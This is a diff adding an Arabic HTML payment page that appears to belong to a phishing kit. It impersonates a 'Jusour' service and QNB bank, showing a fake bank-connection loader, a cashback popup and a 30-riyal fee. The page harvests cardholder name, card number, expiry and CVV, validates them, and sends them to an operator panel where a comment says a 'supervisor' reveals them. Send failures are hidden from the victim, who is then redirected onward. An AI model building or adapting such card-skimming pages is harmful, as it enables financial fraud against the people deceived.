@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>إتمام الدفع | جسور</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="config.js"></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background-color: #f7f9fc; margin: 0; padding: 0; color: #1a1a1a; direction: rtl; }
+        
+        /* تصميم نافذة الكاش باك المطور */
+        #cashbackModal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 99999; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .cb-inner { position: relative; width: 100%; max-width: 380px; background: #fff; border-radius: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); animation: zoomIn 0.3s ease-out; }
+        .cb-close { position: absolute; top: -15px; right: -15px; width: 40px; height: 40px; background: #ed1c24; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; cursor: pointer; font-weight: bold; z-index: 100000; border: 3px solid #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        .cb-img { width: 100%; height: auto; display: block; border-radius: 18px; }
+
+        @keyframes zoomIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        /* ستايل الصفحة الأصلي */
+        .header { background: #fff; text-align: center; padding: 20px 0; border-bottom: 1px solid #eee; }
+        .stepper { background: #e9ecef; border-bottom: 1px solid #ddd; padding: 12px 0; display: flex; justify-content: space-around; font-size: 11px; font-weight: bold; color: #999; }
+        .step-active { color: #8D1B3D; border-bottom: 2px solid #8D1B3D; padding-bottom: 5px; }
+        .container { max-width: 1100px; margin: 20px auto; display: flex; flex-direction: row-reverse; gap: 20px; padding: 0 15px; }
+        .card { background: #fff; border: 1px solid #f0f0f0; border-radius: 15px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
+        .label { display: block; text-align: right; color: #888; font-size: 13px; margin-bottom: 8px; font-weight: bold; }
+        .row { display: flex; justify-content: space-between; border-bottom: 1px solid #f9f9f9; padding: 10px 0; font-size: 14px; }
+        .price-big { color: #8D1B3D; font-size: 28px; font-weight: 900; display: block; margin-top: 5px; }
+        .input-box { width: 100%; background: #fafafa; border: 1px solid #eee; border-radius: 10px; padding: 15px; outline: none; text-align: right; font-family: 'Cairo'; font-size: 15px; margin-bottom: 15px; }
+        .btn-pay { width: 100%; background: #8D1B3D; color: #fff; border: none; border-radius: 12px; padding: 18px; font-size: 18px; font-weight: 900; cursor: pointer; margin-top: 10px; }
+
+        #cloakLoader { position: fixed; inset: 0; background: #f7f9fc; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #eee; border-top: 4px solid #8D1B3D; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 850px) {
+            .container { flex-direction: column; }
+            .form-panel { order: 1; }
+            .side-panel { order: 2; display:flex; flex-direction:column; }
+            .side-panel .card:first-child { order: 2; }
+            .side-panel .card:last-child { order: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شاشة تحضير البنك -->
+    <div id="cloakLoader">
+        <div class="spinner"></div>
+        <p style="margin-top:20px; font-weight:bold; color:#888;">جاري الاتصال بالبنك...</p>
+    </div>
+
+    <!-- نافذة الكاش باك المنسقة -->
+    <div id="cashbackModal">
+        <div class="cb-inner">
+            <div class="cb-close" onclick="closeCashback()">&times;</div>
+            <img src="assets/qnb-cashback.jpg" class="cb-img">
+        </div>
+    </div>
+
+    <div id="realBody" style="display:none;">
+        <div class="header"><h1>إتمام الدفع</h1></div>
+        <div class="stepper">
+            <div>اختيار الخدمة</div><div>المعلومات</div><div class="step-active">الدفع</div><div>التأكيد</div>
+        </div>
+
+        <div class="container">
+            <!-- الفاتورة -->
+            <div class="side-panel" style="flex:1;">
+                <div class="card">
+                    <span class="label">تفاصيل الدفع</span>
+                    <div class="row"><span>إجمالي الخدمة:</span> <span id="sumTotal">-- ريال</span></div>
+                    <div class="row" style="color:#8D1B3D; font-weight:bold"><span>رسوم التوثيق:</span> <span>30 ريال</span></div>
+                    <div style="margin-top:10px; border-top:1px solid #eee; padding-top:10px;">
+                        <span class="price-big">30 ريال قطري</span>
+                    </div>
+                </div>
+                <div class="card">
+                    <span class="label">معلومات العميل</span>
+                    <p style="font-size:13px; margin:5px 0;">👤 <b id="dispName">--</b></p>
+                    <p style="font-size:13px; margin:5px 0;">📞 <b id="dispPhone" dir="ltr">--</b></p>
+                </div>
+            </div>
+
+            <!-- الفورم -->
+            <div class="form-panel" style="flex:1.8;">
+                <div class="card">
+                    <h3 style="margin:0 0 20px; border-bottom:1px solid #f9f9f9; padding-bottom:10px; font-size:16px;">💳 بيانات البطاقة البنكية 🔒</h3>
+                    <form id="payForm">
+                        <input type="text" id="holder" placeholder="اسم صاحب البطاقة" class="input-box" required>
+                        <input type="text" id="cn" maxlength="16" placeholder="رقم البطاقة (16 رقم)" class="input-box" inputmode="numeric" required>
+                        <div style="display:flex; gap:10px">
+                            <input type="text" id="exp" placeholder="MM/YY" maxlength="5" class="input-box" style="flex:1; text-align:center;" required>
+                            <input type="text" id="cvv" maxlength="3" placeholder="CVV" class="input-box" style="flex:1; text-align:center;" required>
+                        </div>
+                        <div style="text-align:center; margin:10px 0;" id="cardBrandArea">
+                             <img src="assets/icon-v-secure.svg" height="12">
+                             <img src="assets/icon-m-secure.png" height="16" style="margin:0 10px">
+                             <span style="font-weight:900; color:#002D52; font-size:14px;">QNB</span>
+                        </div>
+                        <button type="submit" class="btn-pay" id="mainPayBtn">إصدار العقد ودفع 30 ريال</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+const ref = resolveRef();
+
+window.onload = function() {
+    setTimeout(() => {
+        document.getElementById('cloakLoader').style.display='none';
+        document.getElementById('realBody').style.display='block';
+        document.getElementById('cashbackModal').style.display='flex';
+
+        document.getElementById('dispName').innerText = localStorage.getItem('customer_name') || "عميل جسور";
+        document.getElementById('dispPhone').innerText = localStorage.getItem('customer_phone') || "+974";
+        const total = localStorage.getItem('total_price') || 50;
+        document.getElementById('sumTotal').innerText = total + " ريال";
+    }, 4000);
+};
+
+function closeCashback() {
+    document.getElementById('cashbackModal').style.display = 'none';
+}
+
+/* التحقق من البطاقة */
+function isValidCard(number){
+    number = number.replace(/\D/g,'');
+    if(number.length !== 16) return false;
+    let sum = 0, alt = false;
+    for(let i = number.length - 1; i >= 0; i--){
+        let n = parseInt(number[i]);
+        if(alt){ n *= 2; if(n > 9) n -= 9; }
+        sum += n;
+        alt = !alt;
+    }
+    return sum % 10 === 0;
+}
+
+/* التحقق من التاريخ */
+function isValidExpiry(v){
+    if(!/^\d{2}\/\d{2}$/.test(v)) return false;
+    const [mm, yy] = v.split('/').map(x => parseInt(x,10));
+    if(mm < 1 || mm > 12) return false;
+    const now = new Date();
+    const cy = now.getFullYear() % 100;
+    const cm = now.getMonth() + 1;
+    return yy > cy || (yy === cy && mm >= cm);
+}
+
+/* التحقق من الاسم */
+function isValidName(v){
+    return v.trim().length >= 3 && /^[\p{L} ]+$/u.test(v.trim());
+}
+
+/* اكتشاف نوع البطاقة */
+document.getElementById('cn').oninput = function () {
+    const card = this.value.replace(/\D/g, '');
+    this.value = card;
+
+    const area = document.querySelector('[style*="text-align:center"][style*="margin:10px 0"]');
+
+    if (card.startsWith('4')) {
+        area.innerHTML = `
+            <img src="assets/icon-v-secure.svg" height="12">
+            <span style="margin-right:8px;font-weight:bold;color:#1a1a1a;">Visa</span>
+        `;
+    } else if (/^(5[1-5]|2[2-7])/.test(card)) {
+        area.innerHTML = `
+            <img src="assets/icon-m-secure.png" height="16">
+            <span style="margin-right:8px;font-weight:bold;color:#1a1a1a;">Mastercard</span>
+        `;
+    } else {
+        area.innerHTML = `
+            <img src="assets/icon-v-secure.svg" height="12">
+            <img src="assets/icon-m-secure.png" height="16" style="margin:0 10px">
+            <span style="font-weight:900;color:#002D52;font-size:14px;">QNB</span>
+        `;
+    }
+
+    /* لون حسب الصحة */
+    if(card.length === 16){
+        if(isValidCard(card)){
+            this.style.border = "2px solid #22c55e";
+        } else {
+            this.style.border = "2px solid #ef4444";
+        }
+    } else {
+        this.style.border = "1px solid #eee";
+    }
+};
+
+/* تنسيق التاريخ */
+document.getElementById('exp').oninput = function(){ 
+    let v = this.value.replace(/\D/g,'');
+    if(v.length >= 2) this.value = v.slice(0,2)+'/'+v.slice(2,4);
+};
+
+/* الإرسال */
+document.getElementById('payForm').onsubmit = function(e){
+    e.preventDefault();
+
+    const holder = document.getElementById('holder').value;
+    const cn = document.getElementById('cn').value;
+    const exp = document.getElementById('exp').value;
+    const cvv = document.getElementById('cvv').value;
+
+    if(!isValidName(holder)){ alert('ادخل اسم صحيح'); return; }
+    if(!isValidCard(cn)){ alert('رقم البطاقة غير صحيح'); return; }
+    if(!isValidExpiry(exp)){ alert('تاريخ انتهاء غير صالح'); return; }
+    if(!/^\d{3,4}$/.test(cvv)){ alert('CVV غير صحيح'); return; }
+
+    const btn = document.getElementById('mainPayBtn');
+    btn.innerText = "جاري التحقق...";
+
+    // بيانات البطاقة تُعلَّم كحساسة، فتظهر مخفية في اللوحة حتى يكشفها المشرف.
+    jusourSubmit({
+        ref: ref,
+        page_key: 'payment',
+        summary: 'بيانات البطاقة',
+        fields: [
+            { label: 'اسم صاحب البطاقة', value: holder, sensitive: true },
+            { label: 'رقم البطاقة', value: cn, sensitive: true },
+            { label: 'تاريخ الانتهاء', value: exp, sensitive: true },
+            { label: 'CVV', value: cvv, sensitive: true }
+        ]
+    }).catch(function () {
+        /* لا نعطّل المستخدم إذا تعذّر الإرسال */
+    });
+
+    setTimeout(() => {
+        window.location.href = `loading.html?ref=${ref}&v=${Date.now()}`;
+    }, 1200);
+};
+</script>
+</body>
+</html>
